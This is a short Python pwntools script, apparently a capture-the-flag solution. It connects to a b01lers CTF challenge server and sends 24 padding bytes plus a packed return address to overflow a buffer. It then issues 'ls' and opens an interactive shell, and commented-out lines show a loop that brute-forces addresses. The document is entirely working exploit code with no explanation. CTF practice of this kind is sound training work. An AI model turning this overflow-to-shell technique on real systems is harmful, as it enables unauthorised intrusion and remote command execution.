from pwn import *
context.log_level='debug'


# for i in range(0x400010,0x401000):
# 	try:
# 		print hex(i)
p = remote('chal.ctf.b01lers.com',1015)
p.recvuntil('Thyself.\n')
p.sendline('A'*24+p64(0x401196))
p.sendline('ls')
p.interactive()
	# except:
	# 	continue
